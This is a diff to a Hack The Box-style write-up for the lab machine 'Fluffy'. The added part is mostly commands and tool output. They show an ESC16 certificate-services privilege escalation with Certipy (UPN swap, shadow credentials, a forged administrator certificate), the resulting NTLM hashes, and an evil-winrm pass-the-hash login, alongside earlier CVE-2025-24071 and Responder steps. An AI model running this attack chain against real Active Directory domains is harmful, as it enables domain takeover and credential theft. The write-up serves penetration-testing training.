@@ -152,7 +152,7 @@ Since we have write access to IT share, we will use [CVE-2025-24071](https://git
 ┌──(celikd㉿kali)-[~/Desktop/cves/CVE-2025-24071]
 └─$ python exploit.py                                               
 Enter your file name: documents
-Enter IP (EX: 192.168.1.162): <your ip>
+Enter IP (EX: 192.168.1.162): 10.10.66.17
 completed
 
 ┌──(celikd㉿kali)-[~/Desktop/cves/CVE-2025-24071]
@@ -237,7 +237,7 @@ putting file exploit.zip as \exploit.zip (0.9 kb/s) (average 0.9 kb/s)
 
 [+] Generic Options:
     Responder NIC              [tun0]
-    Responder IP               [<your ip>]
+    Responder IP               [10.10.66.17]
     Responder IPv6             [dead:beef:4::1049]
     Challenge set              [random]
     Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
@@ -389,7 +389,252 @@ Mode                LastWriteTime         Length Name
 ## ESC16
 `WINRM_SVC` The user doesn't seem to have anything special
 
+```console
+┌──(celikd㉿kali)-[~/Desktop]
+└─$ certipy-ad find -u 'ca_svc' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.66.17 -stdout -vuln
 
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
+[*] Finding certificate templates
+[*] Found 33 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 14 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
+[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
+[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : fluffy-DC01-CA
+    DNS Name                            : DC01.fluffy.htb
+    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
+    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
+    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
+    Certificate Validity End            : 3024-04-17 16:11:16+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
+    Permissions
+      Owner                             : FLUFFY.HTB\Administrators
+      Access Rights
+        ManageCa                        : FLUFFY.HTB\Domain Admins
+                                          FLUFFY.HTB\Enterprise Admins
+                                          FLUFFY.HTB\Administrators
+        ManageCertificates              : FLUFFY.HTB\Domain Admins
+                                          FLUFFY.HTB\Enterprise Admins
+                                          FLUFFY.HTB\Administrators
+        Enroll                          : FLUFFY.HTB\Cert Publishers
+    [!] Vulnerabilities
+      ESC16                             : Security Extension is disabled.
+    [*] Remarks
+      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
+Certificate Templates                   : [!] Could not find any certificate templates
+```
+No Templates Found
 
+There exist [ESC16](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) Vulnerability. Using ESC16-Certipy guide we can proceed to priv esc.
 
+```console
+┌──(celikd㉿kali)-[~/Desktop]
+└─$ certipy find -username ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.66.17 -vulnerable   
+
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 33 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 11 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 14 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
+[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
+[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[*] Saving text output to '20250529120822_Certipy.txt'
+[*] Wrote text output to '20250529120822_Certipy.txt'
+[*] Saving JSON output to '20250529120822_Certipy.json'
+[*] Wrote JSON output to '20250529120822_Certipy.json'
+
+┌──(celikd㉿kali)-[~/Desktop]
+└─$ cat 20250529120822_Certipy.txt 
+Certificate Authorities
+  0
+    CA Name                             : fluffy-DC01-CA
+    DNS Name                            : DC01.fluffy.htb
+    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
+    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
+    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
+    Certificate Validity End            : 3024-04-17 16:11:16+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
+    Permissions
+      Owner                             : FLUFFY.HTB\Administrators
+      Access Rights
+        ManageCa                        : FLUFFY.HTB\Domain Admins
+                                          FLUFFY.HTB\Enterprise Admins
+                                          FLUFFY.HTB\Administrators
+        ManageCertificates              : FLUFFY.HTB\Domain Admins
+                                          FLUFFY.HTB\Enterprise Admins
+                                          FLUFFY.HTB\Administrators
+        Enroll                          : FLUFFY.HTB\Cert Publishers
+    [!] Vulnerabilities
+      ESC16                             : Security Extension is disabled.
+    [*] Remarks
+      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
+Certificate Templates                   : [!] Could not find any certificate templates
+```
+
+There is [ESC16a](https://github.com/ly4k/Certipy/wiki/06-%e2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) vulnerability! , refer to the following link
+
+## Step 1 - Read the original UPN of the victim account (optional - for recovery).
+```console
+┌──(celikd㉿kali)-[~/Desktop]
+└─$ certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.66.17' -user 'ca_svc' read
+
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Reading attributes for 'ca_svc':
+    cn                                  : certificate authority service
+    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
+    name                                : certificate authority service
+    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
+    sAMAccountName                      : ca_svc
+    servicePrincipalName                : ADCS/ca.fluffy.htb
+    userPrincipalName                   : ca_svc@fluffy.htb
+    userAccountControl                  : 66048
+    whenCreated                         : 2025-04-17T16:07:50+00:00
+    whenChanged                         : 2025-05-29T15:31:53+00:00
+```
+
+## Step 2: Update the victim account’s UPN to that of the target administrator `sAMAccountName`.
+
+```console
+┌──(celikd㉿kali)-[~/Desktop]
+└─$ certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.66.17'  -upn 'administrator'  -user 'ca_svc' update
+
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Updating user 'ca_svc':
+    userPrincipalName                   : administrator
+[*] Successfully updated 'ca_svc'
+```
+## Step 3: Request a certificate issued as the `victim` user from any appropriate client authentication template* (e.g., `user`) on the `CA` vulnerable to `ESC16`
+
+```console
+┌──(celikd㉿kali)-[~/Desktop]
+└─$ certipy shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.66.17' -account 'ca_svc' auto
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'ca_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID 'a73d1a8d-8d10-f6ac-d20e-fe25791a1161'
+[*] Adding Key Credential with device ID 'a73d1a8d-8d10-f6ac-d20e-fe25791a1161' to the Key Credentials for 'ca_svc'
+[*] Successfully added Key Credential with device ID 'a73d1a8d-8d10-f6ac-d20e-fe25791a1161' to the Key Credentials for 'ca_svc'
+[*] Authenticating as 'ca_svc' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'ca_svc@fluffy.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'ca_svc.ccache'
+File 'ca_svc.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote credential cache to 'ca_svc.ccache'
+[*] Trying to retrieve NT hash for 'ca_svc'
+[*] Restoring the old Key Credentials for 'ca_svc'
+[*] Successfully restored the old Key Credentials for 'ca_svc'
+[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
+```
+
+```console
+┌──(celikd㉿kali)-[~/Desktop]
+└─$ export KRB5CCNAME=ca_svc.ccache
+```
+Then request a `certificate`
+
+```console
+┌──(celikd㉿kali)-[~/Desktop]
+└─$ certipy req -k -dc-ip '10.10.66.17' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
+[*] Requesting certificate via RPC
+[*] Request ID is 15
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+```
+## Step 4: Restore the UPN of the `victim` account.
+
+```console
+┌──(celikd㉿kali)-[~/Desktop]
+└─$ certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.66.17' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update            ⏎
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Updating user 'ca_svc':
+    userPrincipalName                   : ca_svc@fluffy.htb
+[*] Successfully updated 'ca_svc'
+```
+## Step 5: Authenticate as the target `administrator`.
+
+```console
+┌──(celikd㉿kali)-[~/Desktop]
+└─$ certipy auth -dc-ip '10.10.66.17' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator'
+[*] Using principal: 'administrator@fluffy.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
+```
+We now have NTLM hash of administrator. Using this NTLM hash, we can get win-rm session as user administrator and get the `root.txt`.
+
+```console
+evil-winrm -i fluffy.htb -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
+```
+
+# ROOT.TXT
+![root](01.png){: width="1200" height="800" }
+
+## Summary
+User : `SMB` The file leak is found `CVE-2025-24071`. After obtaining the domain user, a shadow credential attack can be performed to obtain the shadow credentials of the other three users.
+Root : Upgrade to the latest version `Certipy`, find the `ESC16` vulnerability, and follow the steps.
+
+## THANK YOU WITH ❤️C3L1KD
